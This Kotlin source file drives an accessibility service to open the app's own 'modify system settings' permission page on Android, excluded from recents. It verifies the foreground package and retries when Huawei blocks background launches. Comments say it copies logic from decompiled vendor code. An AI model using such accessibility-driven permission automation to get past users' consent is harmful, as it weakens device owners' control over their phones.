package com.storm.safe.rock.service.modules

import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * WRITE_SETTINGS launch with BAL-rejection hardening (T18).
 *
 * Background: `MainOrchestrator.openWriteSettingsPage()` 沿用 vendor `C0327b2.m211743e8`
 * 使用 `service.startActivity(Intent)` 不做 verify。华为 force-stop 后 a11y 解绑期间
 * startActivity 被系统静默 BAL 拒绝（logcat: `appSwitchAllowed: false`），但调用方无从得知
 * （无异常、返回 void）。真机：`[Branch C] 延迟后仍不在设置页面(com.huawei.android.launcher)，跳过`。
 *
 * 本 helper 提供：
 *   - a11y-binding guard：`service.serviceInfo != null` 才尝试启动
 *   - 800ms post-launch verify：检查 `rootInActiveWindow.packageName == "com.android.settings"`
 *   - 1 次 retry
 *
 * ADAPT：复刻加固，vendor 无此 verify。建议 MainOrchestrator.scope 内需要同步确认启动成功时调此 helper。
 */
object WriteSettingsSafeLauncher {
    private const val TAG = "WsSafeLauncher"

    /** 启动后 verify 延迟（与华为 BAL 静默拒绝后显示 launcher 的观察值对齐） */
    const val VERIFY_DELAY_MS: Long = 800L

    /** 期望 verify 通过时 `rootInActiveWindow.packageName` 的值 */
    const val EXPECTED_PACKAGE: String = "com.android.settings"

    /**
     * 启动 WRITE_SETTINGS 页面并 verify。vendor `m211743e8` + 加固 guard/verify/retry。
     *
     * @return 当且仅当 a11y 已绑定、startActivity 调用成功且 verify 通过（或重试后通过）时返回 true。
     */
    suspend fun launchWithVerify(service: MyAccessibilityService): Boolean {
        // Guard 1：a11y service 未绑定（华为 force-stop 场景）— 不要尝试启动
        if (service.serviceInfo == null) {
            Log.w(TAG, "launchWithVerify: a11y service unbound (serviceInfo=null), skip launch")
            return false
        }
        val intent = buildIntent(service)
        val pm = service.applicationContext.packageManager
        val resolved = try { pm.resolveActivity(intent, 0) } catch (e: Exception) {
            Log.w(TAG, "resolveActivity 异常: ${e.message}")
            null
        }
        if (resolved == null) {
            Log.w(TAG, "launchWithVerify: WRITE_SETTINGS intent not resolvable")
            return false
        }
        // 首次尝试
        if (launchAndVerify(service, intent)) return true
        // Guard 2：首次 verify 失败 → 重试 1 次
        Log.w(TAG, "launchWithVerify: 首次 verify 失败，重试 1 次")
        return launchAndVerify(service, intent)
    }

    private suspend fun launchAndVerify(service: MyAccessibilityService, intent: Intent): Boolean {
        return try {
            service.startActivity(intent)
            delay(VERIFY_DELAY_MS)
            val pkg = service.rootInActiveWindow?.packageName?.toString() ?: ""
            val ok = pkg == EXPECTED_PACKAGE
            if (ok) {
                Log.d(TAG, "launchWithVerify: verify OK (pkg=$pkg)")
            } else {
                Log.w(TAG, "launchWithVerify: verify FAIL — 800ms 后 pkg=$pkg")
            }
            ok
        } catch (e: Exception) {
            Log.e(TAG, "launchAndVerify 异常: ${e.message}", e)
            false
        }
    }

    /** vendor `C0327b2.m211743e8` flags 对齐：0x10800000 = NEW_TASK | EXCLUDE_FROM_RECENTS */
    private fun buildIntent(service: MyAccessibilityService): Intent =
        Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = Uri.parse("package:${service.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
}
